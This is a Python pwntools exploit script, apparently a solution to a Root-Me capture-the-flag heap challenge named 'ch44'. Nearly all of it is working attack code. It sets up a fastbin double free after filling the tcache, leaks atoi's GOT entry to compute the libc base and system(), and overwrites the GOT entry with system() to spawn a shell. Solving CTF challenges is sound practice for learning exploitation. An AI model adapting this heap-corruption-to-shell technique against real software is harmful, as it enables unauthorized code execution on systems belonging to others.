#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("ch44")
# libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc is broken again
libc = elf.libc
context.log_level = 'debug'

gs = '''
continue
'''

atoi_got = 0x602078
# DIFF LOCAL
libcdiff = 0x407a0 #0x40730 on the server (atoi - libc)
sysdiff =  0x4f550  #0x4f4e0 on the server (sys-libc)

# DIFF SERVER
# libcdiff = 0x40730 #on the server (atoi - libc)
# sysdiff =  0x4f4e0 #on the server (sys-libc)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0


# FUNCTIONS
def allocate( nm, age ):
	global index
	c.sendline('1')
	c.recvuntil(': ')
	c.sendline( nm )
	c.recvuntil(': ')
	c.sendline( str(age) )
	c.recvuntil('>')
	index += 1
	return index - 1

def free( id ):
	c.sendline('2')
	c.recvuntil(': ')
	c.sendline(str(id))
	c.recvuntil('>')

def view( id ):
	c.sendline('4')
	# print(c.recv())
	c.recvuntil('[' + str(id) + '] ')
	name = c.recvuntil(', ')[:-2]
	age = c.recvuntil(' years')[:-6]
	c.recvuntil('>')
	return name, age
	# return None,None

def edit( id, name, age ):
	c.sendline('3')
	c.recvuntil(': ')
	c.sendline( str(id) )
	c.recvuntil(': ')
	c.sendline( name )
	c.recvuntil(': ')
	c.sendline( str(age) )
	c.recvuntil('>')

def revaddr(addr):
	h = hex(addr)[2:]
	t = ""
	for i in range(len(h) - 2, -2, -2):
		m = i + 2
		t += chr(int(h[i:m], 16))
	return t

# c = remote( 'challenge03.root-me.org', 56544 )
c = start()
c.recvuntil("> ")
c.timeout = 0.1

# =============================================================================


# =============================================================================

#0-6
for i in range(7):
	allocate( chr(ord('A')+i)*40, 15 ) 
	

#7-9
fast_bin_idx = {}
for i in range(4):
	fast_bin_idx[str(i)] = allocate( chr(ord('X')+i)*40, 15 )

#10
guard1 = allocate( '@'*56, 15 )

#clear 0-6
for i in range(7):
	free(i)

#release indexes 7&8&9
free(fast_bin_idx['0'])
free(fast_bin_idx['3'])
free(fast_bin_idx['2'])
free(fast_bin_idx['3'])


index= 0

#will ocuupy indexes 0-6
for i in range(7):
	allocate( chr(ord('A')+i)*40, 15 )


fb3_handler = allocate( 'Q'*40, 15 ) # fast_bin_3, index = 7
log.info(f'FB3={fast_bin_idx["3"]}')
free(fast_bin_idx["3"]) # fast_Bin_3
#fast_bin_3 
log.info(f'FB3={fast_bin_idx["1"]}')

free(fast_bin_idx['1'])
allocate( 'A'*8, 15 )
allocate( 'A'*8 + revaddr(atoi_got), 32 )
# c.interactive()
name, age = view(fb3_handler)
log.info(f'{name}')
print(type(name),name)
leak = u64(name.ljust(8, b'\x00'))
print(p64(leak))
libc_base = leak - libcdiff
system = libc_base + sysdiff

print ('libc_base @ ' + hex(libc_base))
print ('system() @ ' + hex(system))
edit( fb3_handler, p64(system), 'sh\x00' )
c.interactive()



# free(2)
# free(1)
# free(2)

